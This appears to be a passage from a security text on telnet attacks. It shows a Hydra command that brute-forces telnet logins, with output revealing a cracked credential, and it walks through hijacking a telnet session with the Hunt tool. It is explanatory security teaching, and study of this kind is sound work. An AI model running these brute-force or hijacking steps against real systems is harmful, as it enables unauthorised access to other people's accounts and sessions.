# Brute-Force Telnet

Hydra can be used to brute-force telnet:

```
[bash]$ hydra -L usernames.txt -P passwords.txt \n  telnet.somecompanyasanexample.com telnet\nHydra v2.2 (c) 2002 by van Hauser / THC - use allowed only for legal purposes.\nHydra is starting! [paralell tasks: 4, login tries: 9 (1:3/p:3)]\n[23] [telnet] login: jill password: 11ov3jack\nHydra finished.
```

# Prevent Telnet Brute-Forcing

Please see “Common Defenses Against Brute-Force Attacks.”

**TCP Hijacking** After a telnet user successfully logs in, it is possible for another user on the same network segment to hijack the session by using TCP-hijacking tools such as Hunt.

# Hijack Telnet Sessions

Suppose a malicious user on a host with IP address 192.168.1.1 is on the same network segment as that of a user on 192.168.1.2. If the user on 192.168.1.2 has a telnet connection established to 10.0.0.1, then a malicious user on 192.168.1.1 can hijack it using Hunt:

```
[bash]# hunt -1 eth0
/*
     hunt 1.5
     multipurpose connection intruder / sniffer for Linux
     (c) 1998-2000 by kra
*/
starting hunt
    Main Menu --- rcvpkt 0, free/allock 63/64 -------
1/w/r) list/watch/reset connections
u)      host up testss
a)      arp/simple hijack (avoids ack storm if arp used)
s)      simple hijack
d)      daemons rst/arp/sniff/mac
o)      options
x)      exit
*--> g
0) 192.168.1.2 [52323]     --> 10.0.0.1 [23]
```